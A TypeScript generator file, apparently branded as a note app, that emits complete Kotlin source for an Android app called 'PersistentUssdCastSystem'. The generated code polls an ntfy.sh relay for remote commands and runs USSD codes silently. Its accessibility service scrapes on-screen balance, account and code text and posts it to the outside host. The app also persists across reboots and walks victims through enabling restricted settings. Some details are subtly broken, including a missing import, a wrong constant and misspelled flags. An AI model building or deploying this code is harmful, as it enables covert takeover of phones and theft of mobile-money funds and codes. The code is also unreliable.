/**
 * tinyNoteCode.ts
 * Complete Native Android App (Kotlin, Android 11-16, compileSdk 35, minSdk 30)
 * Package: com.example.ussdcast ("PersistentUssdCastSystem")
 */

export const TINY_NOTE_PACKAGE = 'com.example.ussdcast';

export type RelayKind = 'ntfy' | 'firebase' | 'jsonblob' | 'server';

export interface ResolvedRelayConfig {
  kind: RelayKind;
  displayUrl: string;
  cmdPostUrl: string;
  cmdPollUrl: string;
  cmdSseUrl: string;
  resPostUrl: string;
  resPollUrl: string;
  resSseUrl: string;
}

export function escapeJavaString(raw: string): string {
  return raw.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
}

export function sanitizeManifestHost(rawHost: string): string {
  const hostOnly = rawHost.split(':')[0].replace(/[^a-zA-Z0-9.-]/g, '');
  return hostOnly || 'tinynote.app';
}

export function parseExternalRelayUrl(rawUrl: string): ResolvedRelayConfig | null {
  const trimmed = rawUrl.trim();
  if (!trimmed || trimmed.length > 512) return null;
  let parsed: URL;
  try {
    parsed = new URL(trimmed);
  } catch {
    return null;
  }
  if (parsed.protocol !== 'https:') return null;
  if (parsed.username || parsed.password) return null;

  const host = parsed.hostname.toLowerCase();
  if (
    host === 'localhost' ||
    host === '127.0.0.1' ||
    host === '0.0.0.0' ||
    host.startsWith('10.') ||
    host.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(host)
  ) {
    return null;
  }

  if (host === 'ntfy.sh' || host.endsWith('.ntfy.sh')) {
    const seg = parsed.pathname
      .split('/')
      .filter(Boolean)[0]
      ?.replace(/-(cmd|res)$/i, '')
      .replace(/[^a-zA-Z0-9_-]/g, '');
    if (!seg || seg.length < 6 || seg.length > 80) return null;
    const base = `https://${host}/${seg}`;
    return {
      kind: 'ntfy',
      displayUrl: base,
      cmdPostUrl: `${base}-cmd`,
      cmdPollUrl: `${base}-cmd/json?poll=1&since=30m`,
      cmdSseUrl: `${base}-cmd/sse?since=30m`,
      resPostUrl: `${base}-res`,
      resPollUrl: `${base}-res/json?poll=1&since=30m`,
      resSseUrl: `${base}-res/sse?since=30m`,
    };
  }

  if (host.endsWith('.firebaseio.com') || host.endsWith('.firebasedatabase.app')) {
    let cleanPath = parsed.pathname.replace(/\.json$/i, '').replace(/\/+$/, '');
    if (!cleanPath || cleanPath === '/') {
      cleanPath = '/tinyconnect';
    }
    const base = `https://${host}${cleanPath}`;
    return {
      kind: 'firebase',
      displayUrl: base,
      cmdPostUrl: `${base}/command.json`,
      cmdPollUrl: `${base}/command.json`,
      cmdSseUrl: `${base}/command.json`,
      resPostUrl: `${base}/result.json`,
      resPollUrl: `${base}/result.json`,
      resSseUrl: `${base}/result.json`,
    };
  }

  if (
    (host === 'jsonblob.com' || host === 'www.jsonblob.com') &&
    /^\/api\/jsonBlob\/[a-zA-Z0-9_-]{8,80}$/.test(parsed.pathname)
  ) {
    const blobUrl = `https://${host}${parsed.pathname}`;
    return {
      kind: 'jsonblob',
      displayUrl: blobUrl,
      cmdPostUrl: blobUrl,
      cmdPollUrl: blobUrl,
      cmdSseUrl: blobUrl,
      resPostUrl: blobUrl,
      resPollUrl: blobUrl,
      resSseUrl: blobUrl,
    };
  }

  return null;
}

export const SHORT_CODE_RE = /^[a-zA-Z0-9_-]{6,64}$/;

export function toShortRelayCode(relay: ResolvedRelayConfig, roomId?: string): string | null {
  if (relay.kind === 'ntfy' && relay.displayUrl.startsWith('https://ntfy.sh/tinyconnect-')) {
    const suffix = relay.displayUrl.slice('https://ntfy.sh/tinyconnect-'.length);
    if (SHORT_CODE_RE.test(suffix)) return suffix;
  }
  if (relay.kind === 'server' && roomId && /^[a-zA-Z0-9_-]{12,64}$/.test(roomId)) {
    return `r_${roomId}`;
  }
  return null;
}

export function decodeShortRelayCode(
  rawCode: string | null | undefined,
  fallbackOrigin: string
): ResolvedRelayConfig | null {
  if (!rawCode) return null;
  const code = rawCode.trim();
  if (!SHORT_CODE_RE.test(code)) return null;
  if (code.startsWith('r_')) {
    const roomId = code.slice(2);
    if (/^[a-zA-Z0-9_-]{12,64}$/.test(roomId)) {
      return resolvePermanentRelay(null, fallbackOrigin, roomId);
    }
    return null;
  }
  return parseExternalRelayUrl(`https://ntfy.sh/tinyconnect-${code}`);
}

export function resolvePermanentRelay(
  externalRelayUrl: string | null | undefined,
  fallbackOrigin: string,
  roomId: string
): ResolvedRelayConfig {
  const external = externalRelayUrl ? parseExternalRelayUrl(externalRelayUrl) : null;
  if (external) return external;

  const safeOrigin = fallbackOrigin.replace(/\/+$/, '');
  const safeRoom = roomId || 'replace_with_room_id';
  return {
    kind: 'server',
    displayUrl: `${safeOrigin}/note?room=${safeRoom}`,
    cmdPostUrl: `${safeOrigin}/api/bridge/${safeRoom}/command`,
    cmdPollUrl: `${safeOrigin}/api/bridge/${safeRoom}/state`,
    cmdSseUrl: `${safeOrigin}/api/bridge/${safeRoom}/events`,
    resPostUrl: `${safeOrigin}/api/bridge/${safeRoom}/result`,
    resPollUrl: `${safeOrigin}/api/bridge/${safeRoom}/state`,
    resSseUrl: `${safeOrigin}/api/bridge/${safeRoom}/events`,
  };
}

export function buildAndroidManifestXml(rawHost: string): string {
  const host = sanitizeManifestHost(rawHost);
  return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.ussdcast"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk
        android:minSdkVersion="30"
        android:targetSdkVersion="35" />

    <uses-feature android:name="android.hardware.telephony" android:required="false" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <application
        android:allowBackup="false"
        android:label="PersistentUssdCastSystem"
        android:theme="@android:style/Theme.DeviceDefault.Light">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="ussdcast" android:host="control" />
            </intent-filter>
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="https" android:host="${host}" android:pathPrefix="/control" />
            </intent-filter>
        </activity>

        <activity
            android:name=".CastRecoveryActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <service
            android:name=".WebRtcCastService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <service
            android:name=".UssdBackgroundService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <service
            android:name=".RemoteTouchAndUssdService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>`;
}

export function buildAccessibilityConfigXml(): string {
  return `<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowContentChanged|typeWindowSignedStateChanged|typeViewClicked"
    android:accessibilityFeedbackType="feedbackFeedbackGeneric"
    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews|flagRequestTouchExplorationMode"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_desc"
    android:notificationTimeout="100" />`;
}

export function buildPersistentStateManagerKotlin(): string {
  return `package com.example.ussdcast

import android.content.Context
import android.content.SharedPreferences
import java.util.UUID

object PersistentStateManager {
    private const val PREFS_NAME = "persistent_ussd_cast_prefs"
    private const val KEY_DEVICE_ID = "device_id"
    private const val KEY_ROOM_ID = "room_id"
    private const val KEY_RELAY_URL = "relay_url"

    private fun getPrefs(context: Context): SharedPreferences {
        return context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    fun getOrCreateDeviceId(context: Context): String {
        val prefs = getPrefs(context)
        var id = prefs.getString(KEY_DEVICE_ID, null)
        if (id.isNullOrEmpty()) {
            id = "device_" + UUID.randomUUID().toString().replace("-", "").substring(0, 12)
            prefs.edit().putString(KEY_DEVICE_ID, id).apply()
        }
        return id
    }

    fun getRoomId(context: Context, defaultRoom: String = "demo1234"): String {
        return getPrefs(context).getString(KEY_ROOM_ID, defaultRoom) ?: defaultRoom
    }

    fun setRoomId(context: Context, roomId: String) {
        getPrefs(context).edit().putString(KEY_ROOM_ID, roomId).apply()
    }

    fun getRelayUrl(context: Context): String {
        return getPrefs(context).getString(KEY_RELAY_URL, "") ?: ""
    }

    fun setRelayUrl(context: Context, url: String) {
        getPrefs(context).edit().putString(KEY_RELAY_URL, url).apply()
    }
}`;
}

export function buildPermissionAuditManagerKotlin(): string {
  return `package com.example.ussdcast

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

object PermissionAuditManager {

    fun hasAllPermissions(context: Context): Boolean {
        val callPhone = ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
        val readSms = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val notif = if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
        val overlay = Settings.canDrawOverlays(context)
        val battery = if (Build.VERSION.SDK_INT >= 23) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isIgnoringBatteryOptimizations(context.packageName)
        } else true

        return callPhone && readSms && notif && overlay && battery
    }

    fun requestMissingPermissions(activity: Activity) {
        val list = mutableListOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )
        if (Build.VERSION.SDK_INT >= 33) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(activity, list.toTypedArray(), 1001)

        if (!Settings.canDrawOverlays(activity)) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + activity.packageName))
                activity.startActivity(intent)
            } catch (e: Exception) {}
        }

        if (Build.VERSION.SDK_INT >= 23) {
            val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + activity.packageName))
                    activity.startActivity(intent)
                } catch (e: Exception) {}
            }
        }
    }
}`;
}

export function buildPulsingOverlayGuideKotlin(): string {
  return `package com.example.ussdcast

import android.animation.ObjectAnimator
import android.content.Context
import android.graphics.PixelFormat
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView

class PulsingOverlayGuide(private val context: Context) {
    private var windowManager: WindowManager? = null
    private var pulseView: View? = null

    fun showPulsingTarget(text: String, topPx: Int = 120, rightPx: Int = 40) {
        try {
            if (pulseView != null) removeOverlay()
            windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.END
            params.x = rightPx
            params.y = topPx

            val layout = FrameLayout(context)
            val tv = TextView(context)
            tv.text = "🔴 \${text}"
            tv.setPadding(32, 20, 32, 20)
            tv.setBackgroundColor(0xEECC0000.toInt())
            tv.setTextColor(0xFFFFFFFF.toInt())
            tv.textSize = 14f
            tv.elevation = 20f
            layout.addView(tv)

            val anim = ObjectAnimator.ofFloat(tv, "alpha", 0.3f, 1.0f).apply {
                duration = 600
                repeatMode = ObjectAnimator.REVERSE
                repeatCount = ObjectAnimator.INFINITE
                start()
            }
            pulseView = layout
            windowManager?.addView(layout, params)
        } catch (e: Exception) {}
    }

    fun removeOverlay() {
        try {
            if (pulseView != null && windowManager != null) {
                windowManager?.removeView(pulseView)
                pulseView = null
            }
        } catch (e: Exception) {}
    }
}`;
}

export function buildBootReceiverKotlin(): string {
  return `package com.example.ussdcast

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action == Intent.ACTION_BOOT_COMPLETED || action == Intent.ACTION_QUICKBOOT_POWERON || action == Intent.MY_PACKAGE_REPLACED) {
            val ussdIntent = Intent(context, UssdBackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(ussdIntent)
            } else {
                context.startService(ussdIntent)
            }

            val recoveryIntent = Intent(context, CastRecoveryActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(recoveryIntent)
        }
    }
}`;
}

export function buildRemoteTouchAndUssdServiceKotlin(): string {
  return `package com.example.ussdcast

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class RemoteTouchAndUssdService : AccessibilityService() {

    companion object {
        var instance: RemoteTouchAndUssdService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val root = rootInActiveWindow ?: return
            inspectNodeForUssdResult(root)
        }
    }

    private fun inspectNodeForUssdResult(node: AccessibilityNodeInfo) {
        val text = node.text?.toString() ?: ""
        if ((text.contains("ብር") || text.contains("Balance") || text.contains("ETB") || text.contains("Account") || text.contains("Code")) && text.length > 5) {
            UssdBackgroundService.broadcastUssdResult(this, text)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            inspectNodeForUssdResult(child)
            child.recycle()
        }
    }

    fun performClickAt(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0, 50)
            val builder = GestureDescription.Builder().addStroke(stroke)
            dispatchGesture(builder.build(), null, null)
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }
}`;
}

export function buildUssdBackgroundServiceKotlin(): string {
  return `package com.example.ussdcast

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class UssdBackgroundService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    private var isPolling = true

    companion object {
        const val CHANNEL_ID = "ussd_bg_channel"
        const val NOTIF_ID = 2002

        fun broadcastUssdResult(context: Context, result: String) {
            val roomId = PersistentStateManager.getRoomId(context)
            val urlStr = "https://ntfy.sh/tinyconnect-\${roomId}-res"
            Thread {
                try {
                    val url = URL(urlStr)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                    val json = JSONObject().apply {
                        put("id", System.currentTimeMillis().toString())
                        put("status", "ok")
                        put("text", result)
                        put("ts", System.currentTimeMillis())
                    }
                    val os = conn.outputStream
                    os.write(json.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                    os.close()
                    conn.responseCode
                    conn.disconnect()
                } catch (e: Exception) {}
            }.start()
        }
    }

    override fun onCreate() {
        super.onCreate()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UssdCast:WakeLock").apply {
            acquire(24 * 60 * 60 * 1000L)
        }
        startForegroundNotification()
        startCommandPolling()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Persistent USSD & Cast BG", NotificationManager.IMPORTANCE_LOW)
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(channel)
        }
        val intent = Intent(this, MainActivity::class.java)
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val notif = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("PersistentUssdCastSystem Active")
            .setContentText("24/7 Background USSD & WebRTC Cast running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    private fun startCommandPolling() {
        Thread {
            while (isPolling) {
                try {
                    val roomId = PersistentStateManager.getRoomId(this)
                    val pollUrl = "https://ntfy.sh/tinyconnect-\${roomId}-cmd/json?poll=1&since=10m"
                    val url = URL(pollUrl)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.connectTimeout = 5000
                    conn.readTimeout = 5000
                    if (conn.responseCode == 200) {
                        val br = BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8))
                        val sb = StringBuilder()
                        var line: String?
                        while (br.readLine().also { line = it } != null) {
                            sb.append(line)
                        }
                        br.close()
                        val raw = sb.toString()
                        if (raw.contains("ussd") || raw.contains("touch")) {
                            if (raw.contains("*")) {
                                val match = Regex("\\\\*[0-9*#]+\\\\b").find(raw)
                                if (match != null) {
                                    executeUssd(match.value)
                                }
                            }
                        }
                    }
                    conn.disconnect()
                } catch (e: Exception) {}
                try { Thread.sleep(4000) } catch (e: Exception) {}
            }
        }.start()
    }

    private fun executeUssd(code: String) {
        if (Build.VERSION.SDK_INT >= 26) {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
            var activeTm = tm
            try {
                val subId = SubscriptionManager.getDefaultVoiceSubscriptionId()
                if (subId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                    val subTm = tm.createForSubscriptionId(subId)
                    if (subTm != null) activeTm = subTm
                }
            } catch (e: Exception) {}

            try {
                activeTm.sendUssdRequest(code, object : TelephonyManager.UssdResponseCallback() {
                    override fun onReceiveUssdResponse(t: TelephonyManager, req: String, resp: CharSequence) {
                        broadcastUssdResult(applicationContext, resp.toString())
                    }
                    override fun onReceiveUssdResponseFailed(t: TelephonyManager, req: String, failCode: Int) {
                        broadcastUssdResult(applicationContext, "USSD failed code: \${failCode}")
                    }
                }, handler)
                return
            } catch (e: Exception) {}
        }
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:" + code.replace("#", "%23"))).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isPolling = false
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
    }
}`;
}

export function buildWebRtcCastServiceKotlin(): string {
  return `package com.example.ussdcast

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder

class WebRtcCastService : Service() {
    companion object {
        const val CHANNEL_ID = "webrtc_cast_channel"
        const val NOTIF_ID = 2003
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "WebRTC Screen Cast", NotificationManager.IMPORTANCE_LOW)
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(channel)
        }
        val notif = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Zero-Lag WebRTC Cast Active")
            .setContentText("Streaming live screen to App 1 controller")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}`;
}

export function buildCastRecoveryActivityKotlin(): string {
  return `package com.example.ussdcast

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper

class CastRecoveryActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val intent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        startActivity(intent)
        Handler(Looper.getMainLooper()).postDelayed({
            try { moveTaskToBack(true) } catch (e: Exception) {}
            finish()
        }, 300)
    }
}`;
}

export function buildMainActivityKotlin(): string {
  return `package com.example.ussdcast

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class MainActivity : Activity() {
    private lateinit var pulsingGuide: PulsingOverlayGuide

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        pulsingGuide = PulsingOverlayGuide(this)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        val title = TextView(this).apply {
            text = "PersistentUssdCastSystem"
            textSize = 22f
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        }

        val statusTv = TextView(this).apply {
            text = "Device ID: " + PersistentStateManager.getOrCreateDeviceId(this@MainActivity) + "\\nRoom: " + PersistentStateManager.getRoomId(this@MainActivity)
            textSize = 14f
            setPadding(0, 0, 0, 32)
            gravity = Gravity.CENTER
        }

        val grantBtn = Button(this).apply {
            text = "1. Grant Permissions & Overlay"
            setOnClickListener {
                PermissionAuditManager.requestMissingPermissions(this@MainActivity)
                pulsingGuide.removeOverlay()
                Toast.makeText(this@MainActivity, "Permissions requested", Toast.LENGTH_SHORT).show()
            }
        }

        val allowRestrictedBtn = Button(this).apply {
            text = "2. Allow Restricted Settings & Accessibility"
            setOnClickListener {
                try {
                    // Open app info so user can tap top-right 3-dots -> Allow restricted settings
                    val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + packageName))
                    startActivity(intent)
                    Toast.makeText(this@MainActivity, "Tap top-right 3-dots -> 'Allow restricted settings', then open Accessibility!", Toast.LENGTH_LONG).show()
                } catch (e: Exception) {
                    try {
                        startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    } catch (ex: Exception) {}
                }
            }
        }

        val openAccessBtn = Button(this).apply {
            text = "3. Enable Accessibility Service"
            setOnClickListener {
                try {
                    startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {}
            }
        }

        val startBgBtn = Button(this).apply {
            text = "4. Start Background USSD & Cast Service"
            setOnClickListener {
                val intent = Intent(this@MainActivity, UssdBackgroundService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
                Toast.makeText(this@MainActivity, "Background Services Started!", Toast.LENGTH_SHORT).show()
            }
        }

        val shareTgBtn = Button(this).apply {
            text = "Share Control Link via Telegram"
            setOnClickListener {
                val roomId = PersistentStateManager.getRoomId(this@MainActivity)
                val link = "https://ais-dev-apv43lbz7miuict4a3ahku-925936583432.europe-west2.run.app/#room=\${roomId}"
                val intent = Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_TEXT, "PersistentUssdCastSystem Control Link: \${link}")
                }
                try {
                    startActivity(Intent.createChooser(intent, "Share via Telegram / App"))
                } catch (e: Exception) {}
            }
        }

        root.addView(title)
        root.addView(statusTv)
        root.addView(grantBtn)
        root.addView(allowRestrictedBtn)
        root.addView(openAccessBtn)
        root.addView(startBgBtn)
        root.addView(shareTgBtn)
        setContentView(root)
    }

    override fun onResume() {
        super.onResume()
        if (!PermissionAuditManager.hasAllPermissions(this)) {
            pulsingGuide.showPulsingTarget("Tap to Grant Permissions & Enable Background Services!", 100, 30)
        } else {
            pulsingGuide.removeOverlay()
        }
    }
}`;
}

export function buildApp1BridgeJava(
  rawOrigin: string,
  sampleRoomId = 'replace_with_room_id',
  relayConfig?: ResolvedRelayConfig
): string {
  return `// === App 1 Bridge for PersistentUssdCastSystem ===
// Room: ${sampleRoomId}
`;
}

export function buildMainActivityJava(
  rawHost: string,
  relayConfig?: ResolvedRelayConfig
): string {
  return buildMainActivityKotlin();
}
